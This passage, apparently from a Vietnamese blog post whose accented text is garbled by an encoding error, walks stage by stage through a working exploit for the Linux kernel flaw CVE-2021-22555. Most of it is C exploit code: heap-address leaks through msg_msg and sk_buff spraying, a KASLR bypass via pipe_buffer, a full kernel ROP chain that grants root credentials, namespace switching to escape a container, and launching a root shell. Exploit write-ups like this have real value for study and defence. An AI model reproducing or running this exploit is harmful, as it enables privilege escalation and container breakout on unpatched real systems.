\u0026amp; 0xFFFF000000000000) != 0xFFFF000000000000) {\rprintf(\u0026#34;[-] Error kernel heap address is incorrect.\\n\u0026#34;);\rgoto err_rmid;\r}\r   Sau khi spray ƒë·ªÉ c·∫•u tr√∫c sk_buff tr·ªè ƒë·∫øn fake message, ta c·∫ßn leak ƒë·ªãa ch·ªâ c·ªßa secondary message k·∫ø ti·∫øp. Ta c·∫ßn ƒë·ªãa ch·ªâ n√†y ƒë·ªÉ c√≥ th·ªÉ gi·∫£i ph√≥ng v√πng nh·ªõ t·∫°i ƒë√≥. V·ªõi c·∫•u tr√∫c c·ªßa msg_fake l√†:  1 2 3 4 5  struct {\rlong mtype;\rchar mtext[PAGE_SIZE - MSG_MSG_SIZE + PAGE_SIZE - MSG_MSGSEG_SIZE];\r} msg_fake;\r  ·ªû ƒë√¢y, mtext ƒë∆∞·ª£c c·∫•p ph√°t v·ªõi k√≠ch th∆∞·ªõc l√† PAGE_SIZE - MSG_MSG_SIZE + PAGE_SIZE - MSG_MSGSEG_SIZE,\n1 2 3 4 5  #define MSG_MSGSEG_SIZE (sizeof(struct msg_msgseg))\rstruct msg_msgseg {\ruint64_t next;\r};\r   D√πng h√†m peek_msg ƒë·ªÉ l·∫•y fake_message t·∫°i index fake_idx, l∆∞u v√†o msg_fake. C√¢u l·ªánh ·ªü d√≤ng 7 ƒë·ªÉ ƒë√°m b·∫£o r·∫±ng message ch√∫ng ta l·∫•y ra l√† fake_message. V√¨ t·∫•t c·∫£ c√°c message g·ªëc, khi kh·ªüi t·∫°o ƒë·ªÅu g√°n gi√° tr·ªã t·∫°i msg/mtext[SECONDARY_SIZE] = MSG_TAG. Trong c·∫•u tr√∫c struct msg_msg c√≥ m·ªôt tr∆∞·ªùng l√† m_ts ƒë∆∞·ª£c s·ª≠ d·ª•ng ƒë·ªÉ x√°c ƒë·ªãnh k√≠ch th∆∞·ªõc d·ªØ li·ªáu tr·∫£ l·∫°i cho user v·ªõi k√≠ch th∆∞·ªõc g·ªëc l√† 1024-sizeof(struct msg_msg). Tuy nhi√™n, ch√∫ng ta ƒë√£ c·∫•p ph√°t v·ªõi PAGESIZE = 4096 do ƒë√≥, k√≠ch th∆∞·ªõc n√†y c√≥ gi√° tr·ªã l√† 4096 - sizeof(struct msg_msg). Ch√≠nh ƒëi·ªÅu n√†y cho ph√©p ch√∫ng ta ƒë·ªçc ƒë∆∞·ª£c gi√° tr·ªã c·ªßa c·∫•u tr√∫c li·ªÅn k·ªÅ.  Do ƒë√≥, t·∫°i d√≤ng 13 l·∫•y ƒë·ªãa ch·ªâ c·ªßa c·∫•u tr√∫c msg_msg ti·∫øp theo t·ª´ msg_fake. Sau ƒë√≥, l·∫•y ƒë·ªãa ch·ªâ c·ªßa tr∆∞·ªùng m_list_next v√† l∆∞u v√†o kheap_addr. V√¨ kheap_addr l√† n∆°i b·∫Øt ƒë·∫ßu c·ªßa c√°c primary message n√™n n√≥ s·∫Ω l√† b·ªôi c·ªßa PRIMARY_SIZE, ph√©p to√°n kheap_addr \u0026amp; (PRIMARY_SIZE - 1) ·ªü d√≤ng 15 t∆∞∆°ng ƒë∆∞∆°ng v·ªõi kheap_addr mod PRIMARY_SIZE ƒë·ªÉ ki·ªÉm tra xem m_list_next c√≥ ph·∫£i l√† ƒë·ªãa ch·ªâ c·ªßa message k·∫ø ti·∫øp kh√¥ng, n·∫øu kh√¥ng ph·∫£i th√¨ n√≥ s·∫Ω ƒë∆∞·ª£c g√°n gi√° tr·ªã m_list_prev. C√¢u l·ªánh if ·ªü d√≤ng 19-22 ƒë·ªÉ ki·ªÉm tra xem ƒë·ªãa ch·ªâ c·ªßa ch√∫ng ta c√≥ h·ª£p l·ªá kh√¥ng.  Freeing fake secondary messages\u0026hellip; 1 2  printf(\u0026#34;[*] Freeing fake secondary messages...\\n\u0026#34;);\rfree_skbuff(ss, secondary_buf, sizeof(secondary_buf));\r  1 2 3 4 5 6 7 8 9 10 11 12  int free_skbuff(int ss[NUM_SOCKETS][2], void *buf, size_t size) {\rfor (int i = 0; i \u0026lt; NUM_SOCKETS; i++) {\rfor (int j = 0; j \u0026lt; NUM_SKBUFFS; j++) {\rif (read(ss[i][1], buf, size) \u0026lt; 0) {\rperror(\u0026#34;[-] read\u0026#34;);\rreturn -1;\r}\r}\r}\rreturn 0;\r}\r  B∆∞·ªõc ti·∫øp theo gi·∫£i ph√≥ng v√πng nh·ªõ fake_secondary messages. T∆∞∆°ng t·ª± nh∆∞ h√†m spray_skbuff, h√†m free_skbuff d√πng 2 v√≤ng for ƒë·ªÉ ƒëi qua t·∫•t c·∫£ c√°c c·∫∑p sockets v√† t·∫•t c·∫£ c√°c c·∫•u tr√∫c sk_buff tr√™n t·ª´ng c·∫∑p socker ƒë·ªÉ ƒë·ªçc d·ªØ li·ªáu t·ª´ v√πng nh·ªõ ƒë√£ ƒë∆∞·ª£c ghi v√†o ss b·∫±ng l·ªánh read. L·ªánh read sau ƒëi ƒë·ªçc xong s·∫Ω ti·∫øn h√†nh gi·∫£i ph√≤ng v√πng nh·ªõ n√†y V√† ƒë·ª´ng qu√™n, c·∫•u tr√∫c sk_buff tr·ªè v√†o v√πng nh·ªõ v·ª´a ƒë∆∞·ª£c gi·∫£i ph√≥ng v·∫´n c√≤n t·ªìn t·∫°i.\nSpraying fake secondary messages\u0026hellip; 1 2 3 4 5 6 7 8 9  // Put kheap_addr at next to leak its content. Assumes zero bytes before\r // kheap_addr.\r printf(\u0026#34;[*] Spraying fake secondary messages...\\n\u0026#34;);\rmemset(secondary_buf, 0, sizeof(secondary_buf));\rbuild_msg_msg((void *)secondary_buf, 0x41414141, 0x42424242,\rsizeof(msg_fake.mtext), kheap_addr - MSG_MSGSEG_SIZE);\rif (spray_skbuff(ss, secondary_buf, sizeof(secondary_buf)) \u0026lt; 0)\rgoto err_rmid;\r   Ch√∫ng ta x√¢y d·ª±ng l·∫°i m·ªôt fake secondary message, nh∆∞ng l·∫ßn n√†y, ch√∫ng ta x√¢y d·ª±ng v·ªõi msg-\u0026gt;next = kheap_addr - MSG_MSGSEG_SIZE, v·ªõi kheap_addr l√† ƒë·ªãa ch·ªâ ƒë∆∞·ª£c leak t·ª´ step tr∆∞·ªõc. Ta ti·∫øn h√†nh spray b·∫±ng l·ªánh spray_skbuff.  Leaking primary message\u0026hellip; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  // Use the fake secondary message to read from kheap_addr.\r printf(\u0026#34;[*] Leaking primary message...\\n\u0026#34;);\rif (peek_msg(msqid[fake_idx], \u0026amp;msg_fake, sizeof(msg_fake), 1) \u0026lt; 0)\rgoto err_rmid;\r// Check if the leak is valid.\r if (*(int *)\u0026amp;msg_fake.mtext[PAGE_SIZE] != MSG_TAG) {\rprintf(\u0026#34;[-] Error could not leak primary message.\\n\u0026#34;);\rgoto err_rmid;\r}\r// The primary message contains a pointer to the secondary message.\r msg = (struct msg_msg *)\u0026amp;msg_fake.mtext[PAGE_SIZE - MSG_MSG_SIZE];\rkheap_addr = msg-\u0026gt;m_list_next;\rif (kheap_addr \u0026amp; (SECONDARY_SIZE - 1))\rkheap_addr = msg-\u0026gt;m_list_prev;\r// Calculate the address of the fake secondary message.\r kheap_addr -= SECONDARY_SIZE;\rprintf(\u0026#34;[+] kheap_addr: %\u0026#34; PRIx64 \u0026#34;\\n\u0026#34;, kheap_addr);\rif ((kheap_addr \u0026amp; 0xFFFF00000000FFFF) != 0xFFFF000000000000) {\rprintf(\u0026#34;[-] Error kernel heap address is incorrect.\\n\u0026#34;);\rgoto err_rmid;\r   B∆∞·ªõc n√†y cƒÉn b·∫£n gi·ªëng v·ªõi thao t√°c l·∫•y ƒë·ªãa ch·ªâ c·ªßa primary message truocs ƒë√≥, ƒëi·ªÉm kh√°c suy nh·∫•t l√† ch√∫ng ta c·∫•u tr√∫c msg_msg ƒë∆∞·ª£c l·∫•y ra t·ª´ ƒë·ªãa ch·ªâ PAGE_SIZE-MSG_MSG_SIZE  STAGE 3: KASLR bypass Freeing fake secondary messages\u0026hellip; B∆∞·ªõc n√†y ƒë∆°n gian g·ªçi l·∫°i h√†m free_skbuff ƒë·ªÉ gi·∫£i ph√≥ng v√πng nh·ªõ c·ªßa fake secondary messages.\n1 2  printf(\u0026#34;[*] Freeing fake secondary messages...\\n\u0026#34;);\rfree_skbuff(ss, secondary_buf, sizeof(secondary_buf));\r  Spraying fake secondary messages\u0026hellip; 1 2 3 4 5 6 7  // Put kheap_addr at m_list_next \u0026amp; m_list_prev so that list_del() is possible.\r printf(\u0026#34;[*] Spraying fake secondary messages...\\n\u0026#34;);\rmemset(secondary_buf, 0, sizeof(secondary_buf));\rbuild_msg_msg((void *)secondary_buf, kheap_addr, kheap_addr, 0, 0);\rif (spray_skbuff(ss, secondary_buf, sizeof(secondary_buf)) \u0026lt; 0)\rgoto err_rmid;\r  Ch√∫ng ta x√¢y d·ª±ng c·∫•u tr√∫c msg_msg m·ªõi m√† ·ªü ƒë√≥, m_list_next v√† m_list_prev c√πng tr·ªè v·ªÅ 1 ƒë·ªãa ch·ªâ l√† kheap_buff\nFreeing sk_buff data buffer\u0026hellip; 1 2 3 4  printf(\u0026#34;[*] Freeing sk_buff data buffer...\\n\u0026#34;);\rif (read_msg(msqid[fake_idx], \u0026amp;msg_fake, sizeof(msg_fake), MTYPE_FAKE) \u0026lt; 0)\rgoto err_rmid;\r  Gi·∫£i ph√≥ng v√πng nh·ªõ m√† sk_buff tr·ªè t·ªõi b·∫±ng l·ªánh read_msg\nSpraying pipe_buffer objects\u0026hellip; 1 2 3 4 5 6 7 8 9 10 11 12 13  printf(\u0026#34;[*] Spraying pipe_buffer objects...\\n\u0026#34;);\rfor (int i = 0; i \u0026lt; NUM_PIPEFDS; i++) {\rif (pipe(pipefd[i]) \u0026lt; 0) {\rperror(\u0026#34;[-] pipe\u0026#34;);\rgoto err_rmid;\r}\r// Write something to populate pipe_buffer.\r if (write(pipefd[i][1], \u0026#34;pwn\u0026#34;, 3) \u0026lt; 0) {\rperror(\u0026#34;[-] write\u0026#34;);\rgoto err_rmid;\r}\r}\r   Khi pipe ƒë∆∞·ª£c g·ªçi, n√≥ s·∫Ω g·ªçi h√†m alloc_pipe_info() ƒë·ªÉ c·∫•p ph√°t c√°c v√πng nh·ªõ v·ªõi c·∫•u tr√∫c l√† struct pipe_buffer  1 2 3 4 5 6 7 8 9 10 11 12 13 14  // https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/fs/pipe.c\rstruct pipe_inode_info *alloc_pipe_info(void)\r{\r...\runsigned long pipe_bufs = PIPE_DEF_BUFFERS;\r...\rpipe = kzalloc(sizeof(struct pipe_inode_info), GFP_KERNEL_ACCOUNT);\rif (pipe == NULL)\rgoto out_free_uid;\r...\rpipe-\u0026gt;bufs = kcalloc(pipe_bufs, sizeof(struct pipe_buffer),\rGFP_KERNEL_ACCOUNT);\r...\r}\r  v√† c·∫•u tr√∫c c·ªßa struct pipe_buffer:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  // https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/include/linux/pipe_fs_i.h\rstruct pipe_buffer {\rstruct page *page;\runsigned int offset, len;\rconst struct pipe_buf_operations *ops;\runsigned int flags;\runsigned long private;\r};\rstruct pipe_buf_operations {\r...\r/*\r* When the contents of this pipe buffer has been completely\r* consumed by a reader, -\u0026gt;release() is called.\r*/\rvoid (*release)(struct pipe_inode_info *, struct pipe_buffer *);\r...\r};\r  ch·ª©a con tr·ªè tr·ªè t·ªõi pipe_buf_operation. M·∫∑t kh√°c, khi ƒë∆∞·ª£c c·∫•p ph√°t, ops s·∫Ω tr·ªè t·ªõi m·ªôt static struct anon_pipe_buf_ops. C·∫•u tr√∫c n√†y n·∫±m trong v√πng .data:\n1 2 3 4 5 6 7  // https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/fs/pipe.c\rstatic const struct pipe_buf_operations anon_pipe_buf_ops = {\r.release = anon_pipe_buf_release,\r.try_steal = anon_pipe_buf_try_steal,\r.get = generic_pipe_buf_get,\r};\r  V√¨ kho·∫£ng c√°ch t·ª´ .data v·ªõi .text lu√¥n kh√¥ng ƒë·ªïi, n√™n t·ª´ ƒë·ªãa ch·ªâ anon_pipe_buf_ops ch√∫ng ta c√≥ th·ªÉ t√≠nh kernel base address. V√¨ v·∫≠y, ch√∫ng ta spray ƒë·ªÉ c·∫•p ph√°t c√°c c·∫•u tr√∫c pipe_buffer v·ªõi m·ª•c ti√™u 1 c·∫•u tr√∫c s·∫Ω n·∫±m ngay v·ªã tr√≠ ƒë∆∞·ª£c struct sk_buff tr·ªè t·ªõi v·ª´a ƒë∆∞·ª£c gi·∫£i ph√≥ng ·ªü b∆∞·ªõc tr∆∞·ªõc.\nLeaking and freeing pipe_buffer object\u0026hellip; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  printf(\u0026#34;[*] Leaking and freeing pipe_buffer object...\\n\u0026#34;);\rfor (int i = 0; i \u0026lt; NUM_SOCKETS; i++) {\rfor (int j = 0; j \u0026lt; NUM_SKBUFFS; j++) {\rif (read(ss[i][1], secondary_buf, sizeof(secondary_buf)) \u0026lt; 0) {\rperror(\u0026#34;[-] read\u0026#34;);\rgoto err_rmid;\r}\rif (*(uint64_t *)\u0026amp;secondary_buf[0x10] != MTYPE_FAKE)\rpipe_buffer_ops = *(uint64_t *)\u0026amp;secondary_buf[0x10];\r}\r}\rkbase_addr = pipe_buffer_ops - ANON_PIPE_BUF_OPS;\rprintf(\u0026#34;[+] anon_pipe_buf_ops: %\u0026#34; PRIx64 \u0026#34;\\n\u0026#34;, pipe_buffer_ops);\rprintf(\u0026#34;[+] kbase_addr: %\u0026#34; PRIx64 \u0026#34;\\n\u0026#34;, kbase_addr);\rif ((kbase_addr \u0026amp; 0xFFFF0000000FFFFF) != 0xFFFF000000000000) {\rprintf(\u0026#34;[-] Error kernel base address is incorrect.\\n\u0026#34;);\rgoto err_rmid;\r}\r   Ch√∫ng ta d√πng 2 v√≤ng for ƒë·ªÉ ƒëi qua t·∫•t c·∫£ c√°c v√πng nh·ªõ m√† sk_buff tr·ªè t·ªõi, t·∫°i ƒë√¢y, ta ƒë·ªçc d·ªØ li·ªáu, l∆∞u v√†o v√πng ƒë·ªám secondary_buf t·∫°i d√≤ng 4. T·∫°i d√≤ng s·ªë 8 ki·ªÉm tra ƒë·ªÉ x√°c t√¨m v√πng nh·ªõ m√† ch√∫ng ta mu·ªën. MTYPE_FAKE l√† gi√° tr·ªã ƒë∆∞·ª£c g√°n cho msg-\u0026gt;mtype khi ch√∫ng ta t·∫°o fake_msg_msg t·ª´ h√†m build_msg_msg. Do ƒë√≥, v√πng nh·ªõ n√†o c√≥ gi√° tr·ªã t·∫°i secondary_buf[0x10] kh√°c v·ªõi MTYPE_FAKE ch√≠nh l√† v√πng nh·ªõ ch√∫ng c·ªßa pipe_buffer m√† ch√∫ng ta spray ƒë∆∞·ª£c. Ta l·∫•y ƒë·ªãa ch·ªâ c·ªßa v√πng nh·ªõ n√†y t·∫°i d√≤ng 9 v√† l∆∞u v√†o bi·∫øn pipe_buffer_ops kbase_addr ƒë∆∞·ª£c t√≠n t·ª´ c√¥ng th·ª©c ·ªü d√≤ng 13, trong ƒë√≥:  ƒê·ªÉ t√≠nh ANON_PIPE_BUF_OPS ta t√≠nh l·∫•y ƒë·ªãa ch·ªâ anon_pipe_buf_ops v√† _text trong file /proc/kallsyms:\n1 2 3 4 5 6  root@ubuntu:/home/edisc/Desktop/cve-2021-22555/security-research/pocs/linux/cve-2021-22555# cat /proc/kallsyms | grep anon_pipe_buf_ops\rffffffff9c878380 r anon_pipe_buf_ops root@ubuntu:/home/edisc/Desktop/cve-2021-22555/security-research/pocs/linux/cve-2021-22555# cat /proc/kallsyms | grep _text ffffffff9b800000 T _text\r  ANON_PIPE_BUF_OPS = anon_pipe_buf_ops - _text\rSTAGE 4: Kernel code execution 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40  printf(\u0026#34;[+] STAGE 4: Kernel code execution\\n\u0026#34;);\rprintf(\u0026#34;[*] Spraying fake pipe_buffer objects...\\n\u0026#34;);\rmemset(secondary_buf, 0, sizeof(secondary_buf));\rbuf = (struct pipe_buffer *)\u0026amp;secondary_buf;\rbuf-\u0026gt;ops = kheap_addr + 0x290;\rops = (struct pipe_buf_operations *)\u0026amp;secondary_buf[0x290];\r#ifdef KERNEL_COS_5_4_89\r // RAX points to \u0026amp;buf-\u0026gt;ops.\r // RCX points to \u0026amp;buf.\r ops-\u0026gt;release = kbase_addr + PUSH_RAX_JMP_QWORD_PTR_RCX;\r#elif KERNEL_UBUNTU_5_8_0_48\r // RSI points to \u0026amp;buf.\r ops-\u0026gt;release = kbase_addr + PUSH_RSI_JMP_QWORD_PTR_RSI_39;\r#endif\r build_krop(secondary_buf, kbase_addr, kheap_addr + 0x2B0);\rif (spray_skbuff(ss, secondary_buf, sizeof(secondary_buf)) \u0026lt; 0)\rgoto err_rmid;\r// Trigger pipe_release().\r printf(\u0026#34;[*] Releasing pipe_buffer objects...\\n\u0026#34;);\rfor (int i = 0; i \u0026lt; NUM_PIPEFDS; i++) {\rif (close(pipefd[i][0]) \u0026lt; 0) {\rperror(\u0026#34;[-] close\u0026#34;);\rgoto err_rmid;\r}\rif (close(pipefd[i][1]) \u0026lt; 0) {\rperror(\u0026#34;[-] close\u0026#34;);\rgoto err_rmid;\r}\r}\rprintf(\u0026#34;[*] Checking for root...\\n\u0026#34;);\rif ((fd = open(\u0026#34;/etc/shadow\u0026#34;, O_RDONLY)) \u0026lt; 0) {\rprintf(\u0026#34;[-] Error could not gain root privileges.\\n\u0026#34;);\rgoto err_rmid;\r}\rclose(fd);\rprintf(\u0026#34;[+] Root privileges gained.\\n\u0026#34;);\r  Spraying fake pipe_buffer objects\u0026hellip; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  printf(\u0026#34;[*] Spraying fake pipe_buffer objects...\\n\u0026#34;);\rmemset(secondary_buf, 0, sizeof(secondary_buf));\rbuf = (struct pipe_buffer *)\u0026amp;secondary_buf;\rbuf-\u0026gt;ops = kheap_addr + 0x290;\rops = (struct pipe_buf_operations *)\u0026amp;secondary_buf[0x290];\r#ifdef KERNEL_COS_5_4_89\r // RAX points to \u0026amp;buf-\u0026gt;ops.\r // RCX points to \u0026amp;buf.\r ops-\u0026gt;release = kbase_addr + PUSH_RAX_JMP_QWORD_PTR_RCX;\r#elif KERNEL_UBUNTU_5_8_0_48\r // RSI points to \u0026amp;buf.\r ops-\u0026gt;release = kbase_addr + PUSH_RSI_JMP_QWORD_PTR_RSI_39;\r#endif\r build_krop(secondary_buf, kbase_addr, kheap_addr + 0x2B0);\rif (spray_skbuff(ss, secondary_buf, sizeof(secondary_buf)) \u0026lt; 0)\rgoto err_rmid;\r   Ch√∫ng ta t·∫°o m·ªôt fake pipe_buffer objects v·ªõi kheap_addr + 0x290. Ti·∫øp theo, d√≤ng 6-9 d√πng cho centos 5.4.89 v√† d√≤ng 10-13 cho ubuntu 5.8.0.48 X√¢y d·ª±ng m·ªôt kernel rop l∆∞u v√†o secondary_buf v√† d√πng l·ªánh spray_skbuff ƒë·ªÉ ƒë∆∞a kernel_rop c·ªßa ch√∫ng ta v√†o v√πng nh·ªõ ƒë·ªÉ th·ª±c thi. H√†m build_krop ƒë∆∞·ª£c x√¢y d·ª±ng nh∆∞ sau:  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96  // Note: Must not touch offset 0x10-0x18.\rvoid build_krop(char *buf, uint64_t kbase_addr, uint64_t scratchpad_addr) {\ruint64_t *rop;\r#ifdef KERNEL_COS_5_4_89\r *(uint64_t *)\u0026amp;buf[0x00] = kbase_addr + POP_RSP_POP_RBX_RET;\rrop = (uint64_t *)\u0026amp;buf[0x18];\r// Save RBP at scratchpad_addr.\r *rop++ = kbase_addr + ENTER_0_0_POP_RBX_POP_R14_POP_RBP_RET;\r*rop++ = scratchpad_addr; // R14\r *rop++ = 0xDEADBEEF; // RBP\r *rop++ = kbase_addr + MOV_QWORD_PTR_R14_RBX_POP_RBX_POP_R14_POP_RBP_RET;\r*rop++ = 0xDEADBEEF; // RBX\r *rop++ = 0xDEADBEEF; // R14\r *rop++ = 0xDEADBEEF; // RBP\r\r// commit_creds(prepare_kernel_cred(NULL))\r *rop++ = kbase_addr + POP_RDI_RET;\r*rop++ = 0; // RDI\r *rop++ = kbase_addr + PREPARE_KERNEL_CRED;\r*rop++ = kbase_addr + POP_RDX_RET;\r*rop++ = 1; // RDX\r *rop++ = kbase_addr + CMP_RDX_1_JNE_POP_RBP_RET;\r*rop++ = 0xDEADBEEF; // RBP\r *rop++ = kbase_addr + MOV_RDI_RAX_JNE_POP_RBP_RET;\r*rop++ = 0xDEADBEEF; // RBP\r *rop++ = kbase_addr + COMMIT_CREDS;\r// switch_task_namespaces(find_task_by_vpid(1), init_nsproxy)\r *rop++ = kbase_addr + POP_RDI_RET;\r*rop++ = 1; // RDI\r *rop++ = kbase_addr + FIND_TASK_BY_VPID;\r*rop++ = kbase_addr + POP_RDX_RET;\r*rop++ = 1; // RDX\r *rop++ = kbase_addr + CMP_RDX_1_JNE_POP_RBP_RET;\r*rop++ = 0xDEADBEEF; // RBP\r *rop++ = kbase_addr + MOV_RDI_RAX_JNE_POP_RBP_RET;\r*rop++ = 0xDEADBEEF; // RBP\r *rop++ = kbase_addr + POP_RSI_RET;\r*rop++ = kbase_addr + INIT_NSPROXY; // RSI\r *rop++ = kbase_addr + SWITCH_TASK_NAMESPACES;\r// Load RBP from scratchpad_addr and resume execution.\r *rop++ = kbase_addr + POP_RBP_RET;\r*rop++ = scratchpad_addr - 0x25; // RBP\r *rop++ = kbase_addr + PUSH_QWORD_PTR_RBP_25_POP_RBP_RET;\r*rop++ = kbase_addr + MOV_RSP_RBP_POP_RBP_RET;\r#elif KERNEL_UBUNTU_5_8_0_48\r *(uint64_t *)\u0026amp;buf[0x39] = kbase_addr + POP_RSP_RET;\r*(uint64_t *)\u0026amp;buf[0x00] = kbase_addr + ADD_RSP_D0_RET;\rrop = (uint64_t *)\u0026amp;buf[0xD8];\r// Save RBP at scratchpad_addr.\r *rop++ = kbase_addr + ENTER_0_0_POP_RBX_POP_R12_POP_RBP_RET;\r*rop++ = scratchpad_addr; // R12\r *rop++ = 0xDEADBEEF; // RBP\r *rop++ = kbase_addr + MOV_QWORD_PTR_R12_RBX_POP_RBX_POP_R12_POP_RBP_RET;\r*rop++ = 0xDEADBEEF; // RBX\r *rop++ = 0xDEADBEEF; // R12\r *rop++ = 0xDEADBEEF; // RBP\r\r// commit_creds(prepare_kernel_cred(NULL))\r *rop++ = kbase_addr + POP_RDI_RET;\r*rop++ = 0; // RDI\r *rop++ = kbase_addr + PREPARE_KERNEL_CRED;\r*rop++ = kbase_addr + POP_RCX_RET;\r*rop++ = 4; // RCX\r *rop++ = kbase_addr + CMP_RCX_4_JNE_POP_RBP_RET;\r*rop++ = 0xDEADBEEF; // RBP\r *rop++ = kbase_addr + MOV_RDI_RAX_JNE_XOR_EAX_EAX_RET;\r*rop++ = kbase_addr + COMMIT_CREDS;\r// switch_task_namespaces(find_task_by_vpid(1), init_nsproxy)\r *rop++ = kbase_addr + POP_RDI_RET;\r*rop++ = 1; // RDI\r *rop++ = kbase_addr + FIND_TASK_BY_VPID;\r*rop++ = kbase_addr + POP_RCX_RET;\r*rop++ = 4; // RCX\r *rop++ = kbase_addr + CMP_RCX_4_JNE_POP_RBP_RET;\r*rop++ = 0xDEADBEEF; // RBP\r *rop++ = kbase_addr + MOV_RDI_RAX_JNE_XOR_EAX_EAX_RET;\r*rop++ = kbase_addr + POP_RSI_RET;\r*rop++ = kbase_addr + INIT_NSPROXY; // RSI\r *rop++ = kbase_addr + SWITCH_TASK_NAMESPACES;\r// Load RBP from scratchpad_addr and resume execution.\r *rop++ = kbase_addr + POP_RBP_RET;\r*rop++ = scratchpad_addr - 0xA; // RBP\r *rop++ = kbase_addr + PUSH_QWORD_PTR_RBP_A_POP_RBP_RET;\r*rop++ = kbase_addr + MOV_RSP_RBP_POP_RBP_RET;\r#endif\r}\r   Nguy√™n t·∫Øc ho·∫°t ƒë·ªông c·ªßa Kernel ROP chain l√†:   L∆∞u gi√° tr·ªã c·ªßa RBP t·∫°i m·ªôt s·ªë scratchpad address (scratchpad gi·ªëng nh∆∞ m·ªôt m·∫´u gi·∫•y ghi ch√∫ ƒë·ªÉ l∆∞u tr·ªØ nh·ªØng ki·∫øn th·ª©c t·∫°m th·ªùi khi b·∫°n ƒë·ªçc 1 cu·ªën s√°ch) ƒë·ªÉ sau n√†y s·ª≠ d·ª•ng. G·ªçi h√†m commit_creds(prepare_kernel_cred(NULL)) ƒë·ªÉ c√†i ƒë·∫∑t kernel credentials G·ªçi h√†m switch_task_namespaces(find_task_by_vpid(1), init_nsproxy) ƒë·ªÉ chuy·ªÉn kh√¥ng gian t√™n namespace c·ªßa process 1 th√†nh m·ªôt trong nh·ªØng init process. Kh√¥i ph·ª•c l·∫°i gi√° tr·ªã c·ªßa RBP v√† quay l·∫°i lu·ªìng th·ª±c thi c≈© (ngay sau h√†m free_pipe_info())  Releasing pipe_buffer objects\u0026hellip; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  // Trigger pipe_release().\r printf(\u0026#34;[*] Releasing pipe_buffer objects...\\n\u0026#34;);\rfor (int i = 0; i \u0026lt; NUM_PIPEFDS; i++) {\rif (close(pipefd[i][0]) \u0026lt; 0) {\rperror(\u0026#34;[-] close\u0026#34;);\rgoto err_rmid;\r}\rif (close(pipefd[i][1]) \u0026lt; 0) {\rperror(\u0026#34;[-] close\u0026#34;);\rgoto err_rmid;\r}\r}\rprintf(\u0026#34;[*] Checking for root...\\n\u0026#34;);\rif ((fd = open(\u0026#34;/etc/shadow\u0026#34;, O_RDONLY)) \u0026lt; 0) {\rprintf(\u0026#34;[-] Error could not gain root privileges.\\n\u0026#34;);\rgoto err_rmid;\r}\rclose(fd);\rprintf(\u0026#34;[+] Root privileges gained.\\n\u0026#34;);\rprintf(\u0026#34;\\n\u0026#34;);\r   Sau khi ƒë√£ x√¢y d·ª±ng xong kernel_rop, ch√∫ng ta ti·∫øn h√†nh gi·∫£i ph√≥ng c√°c v√πng nh·ªõ pipe_buffer ƒë·ªÉ k√≠ch ho·∫°t h√†m pipe_release(). B∆∞·ªõc n√†y ta d√πng v√≤ng for ƒë·ªÉ ƒëi qua h·∫øt t·∫•t c·∫£ c√°c pipe filedescriptor v√† d√πng l·ªánh close ƒë·ªÉ gi·∫£i ph√≥ng v√πng nh·ªõ. d√≤ng l·ªánh 33-38 d√πng ƒë·ªÉ ki·ªÉm tra xem li·ªáu ch√∫ng ta ƒë√£ l·∫•y ƒë∆∞·ª£c root hay ch∆∞a v√¨ t·ªáp /etc/shadow ch·ªâ ƒë∆∞·ª£c ƒë·ªçc b·ªüi root.  STAGE 5: Post-exploitation 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30  printf(\u0026#34;[+] STAGE 5: Post-exploitation\\n\u0026#34;);\rprintf(\u0026#34;[*] Escaping container...\\n\u0026#34;);\rsetns(open(\u0026#34;/proc/1/ns/mnt\u0026#34;, O_RDONLY), 0);\rsetns(open(\u0026#34;/proc/1/ns/pid\u0026#34;, O_RDONLY), 0);\rsetns(open(\u0026#34;/proc/1/ns/net\u0026#34;, O_RDONLY), 0);\rprintf(\u0026#34;[*] Cleaning up...\\n\u0026#34;);\rfor (int i = 0; i \u0026lt; NUM_MSQIDS; i++) {\r// TODO: Fix next pointer.\r if (i == fake_idx)\rcontinue;\rif (msgctl(msqid[i], IPC_RMID, NULL) \u0026lt; 0)\rperror(\u0026#34;[-] msgctl\u0026#34;);\r}\rfor (int i = 0; i \u0026lt; NUM_SOCKETS; i++) {\rif (close(ss[i][0]) \u0026lt; 0)\rperror(\u0026#34;[-] close\u0026#34;);\rif (close(ss[i][1]) \u0026lt; 0)\rperror(\u0026#34;[-] close\u0026#34;);\r}\rif (close(s) \u0026lt; 0)\rperror(\u0026#34;[-] close\u0026#34;);\rprintf(\u0026#34;[*] Popping root shell...\\n\u0026#34;);\rchar *args[] = {\u0026#34;/bin/bash\u0026#34;, \u0026#34;-i\u0026#34;, NULL};\rexecve(args[0], args, NULL);\rreturn 0;\r   ƒê√¢y l√† ƒëo·∫°n l·ªánh cho ph√©p ch√∫ng ta tho√°t kh·ªèi docker. Khi ƒë√£ c√≥ root, ch√∫ng ta ti·∫øn h√†nh thay ƒë·ªïi mnt, pid, net namespace ƒë·ªÉ cho ph√©p ch√∫ng ta tho√°t kh·ªèi container. ƒêo·∫°n l·ªánh 4-6 th·ª±c hi·ªán s·ª± thay ƒë·ªïi n√†y. ƒêo·∫°n l·ªánh t·ª´ d√≤ng 8-23 th·ª±c hi·ªán thao t√°c d·ªçn d·∫πp c√°c message queue, ƒë√≥ng t·∫•t c·∫£ c√°c socketpair. Cu·ªëi c√πng th·ª±c hi·ªán l·ªánh ƒë·ªÉ ch·∫°y shell 